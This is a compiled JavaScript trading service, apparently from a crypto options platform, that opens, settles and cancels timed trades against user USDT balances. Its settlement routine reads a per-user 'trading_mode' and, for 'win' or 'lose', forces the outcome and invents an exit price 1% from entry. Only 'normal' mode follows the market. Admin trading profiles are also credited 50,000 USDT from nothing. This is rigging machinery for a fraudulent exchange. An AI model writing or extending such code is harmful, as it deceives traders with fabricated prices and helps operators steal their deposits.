"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.tradingService = void 0;
const storage_1 = require("./storage");
const priceService_1 = require("./priceService");
class TradingService {
    constructor() {
        this.activeTrades = new Map();
    }
    // Create a new options trade
    async createOptionsTrade(request) {
        try {
            // Handle admin users - map them to their trading profile
            let finalUserId = request.userId;
            if (request.userId === 'superadmin-001' || request.userId === 'admin-001') {
                finalUserId = `${request.userId}-trading`;
                console.log(`🔧 Admin user ${request.userId} trading as ${finalUserId}`);
            }
            // Validate minimum amount based on duration
            const optionsSettings = await storage_1.storage.getOptionsSettings();
            const setting = optionsSettings.find(s => s.duration === request.duration && s.isActive);
            if (!setting) {
                return {
                    success: false,
                    message: `Trading duration ${request.duration}s is not available`,
                };
            }
            const tradeAmount = parseFloat(request.amount);
            const minAmount = parseFloat(setting.minAmount);
            if (tradeAmount < minAmount) {
                return {
                    success: false,
                    message: `Minimum amount for ${request.duration}s is $${minAmount}`,
                };
            }
            // Check user balance - create default balance for admin trading profiles
            let userBalance = await storage_1.storage.getBalance(finalUserId, 'USDT');
            if (!userBalance && finalUserId.includes('-trading')) {
                // Create default balance for admin trading profiles
                await storage_1.storage.updateBalance(finalUserId, 'USDT', '50000.00', '0.00');
                userBalance = await storage_1.storage.getBalance(finalUserId, 'USDT');
                console.log(`💰 Created admin trading balance: ${finalUserId} with 50,000 USDT`);
            }
            if (!userBalance || parseFloat(userBalance.available) < tradeAmount) {
                return {
                    success: false,
                    message: 'Insufficient balance',
                };
            }
            // Get current market price
            const currentPrice = await priceService_1.priceService.getCurrentPrice(request.symbol);
            if (!currentPrice) {
                return {
                    success: false,
                    message: 'Unable to get current market price',
                };
            }
            // Lock the trade amount
            const newAvailable = (parseFloat(userBalance.available) - tradeAmount).toString();
            const newLocked = (parseFloat(userBalance.locked || '0') + tradeAmount).toString();
            await storage_1.storage.updateBalance(finalUserId, 'USDT', newAvailable, newLocked);
            // Create the trade
            const expiresAt = new Date(Date.now() + request.duration * 1000);
            const trade = await storage_1.storage.createTrade({
                userId: finalUserId,
                symbol: request.symbol,
                type: 'options',
                direction: request.direction,
                amount: request.amount,
                price: currentPrice,
                entryPrice: currentPrice,
                status: 'active',
                duration: request.duration,
                expiresAt,
            });
            // Schedule trade execution
            this.scheduleTradeExecution(trade.id, request.duration * 1000);
            return {
                success: true,
                trade,
                message: 'Trade created successfully',
            };
        }
        catch (error) {
            console.error('Error creating options trade:', error);
            return {
                success: false,
                message: 'Failed to create trade',
            };
        }
    }
    // Schedule automatic trade execution
    scheduleTradeExecution(tradeId, delayMs) {
        const timeout = setTimeout(async () => {
            await this.executeOptionsTrade(tradeId);
            this.activeTrades.delete(tradeId);
        }, delayMs);
        this.activeTrades.set(tradeId, timeout);
    }
    // Execute an options trade
    async executeOptionsTrade(tradeId) {
        try {
            const trade = await storage_1.storage.getTrade(tradeId);
            if (!trade || trade.status !== 'active') {
                return;
            }
            // Get user's trading mode from user record
            // For admin users trading with mapped IDs, check the original user ID for trading mode
            let originalUserId = trade.userId;
            if (trade.userId.endsWith('-trading')) {
                originalUserId = trade.userId.replace('-trading', '');
            }
            const user = await storage_1.storage.getUser(originalUserId);
            const tradingMode = user?.trading_mode || 'normal';
            console.log(`🎯 Executing trade for user ${trade.userId}`);
            console.log(`🎯 Original user ID for trading mode: ${originalUserId}`);
            console.log(`🎯 User object:`, user);
            console.log(`🎯 Trading mode: ${tradingMode}`);
            const currentPrice = await priceService_1.priceService.getCurrentPrice(trade.symbol);
            if (!currentPrice) {
                console.error(`Cannot execute trade ${tradeId}: No current price available`);
                return;
            }
            let isWin = false;
            let exitPrice = currentPrice;
            // Apply trading mode logic
            switch (tradingMode) {
                case 'win':
                    isWin = true;
                    console.log(`🎯 FORCED WIN for user ${trade.userId}`);
                    // Adjust exit price to ensure win
                    if (trade.direction === 'up') {
                        exitPrice = (parseFloat(trade.entryPrice) * 1.01).toString(); // 1% higher
                    }
                    else {
                        exitPrice = (parseFloat(trade.entryPrice) * 0.99).toString(); // 1% lower
                    }
                    break;
                case 'lose':
                    isWin = false;
                    console.log(`🎯 FORCED LOSE for user ${trade.userId}`);
                    // Adjust exit price to ensure loss
                    if (trade.direction === 'up') {
                        exitPrice = (parseFloat(trade.entryPrice) * 0.99).toString(); // 1% lower
                    }
                    else {
                        exitPrice = (parseFloat(trade.entryPrice) * 1.01).toString(); // 1% higher
                    }
                    break;
                case 'normal':
                default:
                    console.log(`🎯 NORMAL MODE for user ${trade.userId}`);
                    // Use real market logic
                    if (trade.direction === 'up') {
                        isWin = parseFloat(currentPrice) > parseFloat(trade.entryPrice);
                    }
                    else {
                        isWin = parseFloat(currentPrice) < parseFloat(trade.entryPrice);
                    }
                    exitPrice = currentPrice;
                    break;
            }
            // Calculate profit/loss
            const tradeAmount = parseFloat(trade.amount);
            const optionsSettings = await storage_1.storage.getOptionsSettings();
            const setting = optionsSettings.find(s => s.duration === trade.duration);
            const profitPercentage = setting ? parseFloat(setting.profitPercentage) : 10;
            const profit = isWin ? tradeAmount * (profitPercentage / 100) : -tradeAmount;
            // Update trade
            await storage_1.storage.updateTrade(tradeId, {
                status: 'completed',
                exitPrice,
                profit: profit.toString(),
                completedAt: new Date(),
            });
            // Update user balance
            const userBalance = await storage_1.storage.getBalance(trade.userId, 'USDT');
            if (userBalance) {
                const newAvailable = parseFloat(userBalance.available) + tradeAmount + profit;
                const newLocked = parseFloat(userBalance.locked || '0') - tradeAmount;
                await storage_1.storage.updateBalance(trade.userId, 'USDT', Math.max(0, newAvailable).toString(), Math.max(0, newLocked).toString());
            }
            console.log(`Trade ${tradeId} executed: ${isWin ? 'WIN' : 'LOSS'}, Profit: $${profit.toFixed(2)}`);
        }
        catch (error) {
            console.error(`Error executing trade ${tradeId}:`, error);
        }
    }
    // Cancel a trade (if still active)
    async cancelTrade(tradeId, userId) {
        try {
            const trade = await storage_1.storage.getTrade(tradeId);
            if (!trade || trade.userId !== userId || trade.status !== 'active') {
                return false;
            }
            // Cancel the scheduled execution
            const timeout = this.activeTrades.get(tradeId);
            if (timeout) {
                clearTimeout(timeout);
                this.activeTrades.delete(tradeId);
            }
            // Update trade status
            await storage_1.storage.updateTrade(tradeId, {
                status: 'cancelled',
                completedAt: new Date(),
            });
            // Refund the locked amount
            const userBalance = await storage_1.storage.getBalance(userId, 'USDT');
            if (userBalance) {
                const tradeAmount = parseFloat(trade.amount);
                const newAvailable = parseFloat(userBalance.available) + tradeAmount;
                const newLocked = parseFloat(userBalance.locked || '0') - tradeAmount;
                await storage_1.storage.updateBalance(userId, 'USDT', newAvailable.toString(), Math.max(0, newLocked).toString());
            }
            return true;
        }
        catch (error) {
            console.error(`Error cancelling trade ${tradeId}:`, error);
            return false;
        }
    }
    // Get active trades for a user
    async getActiveTrades(userId) {
        return storage_1.storage.getActiveTrades(userId);
    }
}
exports.tradingService = new TradingService();
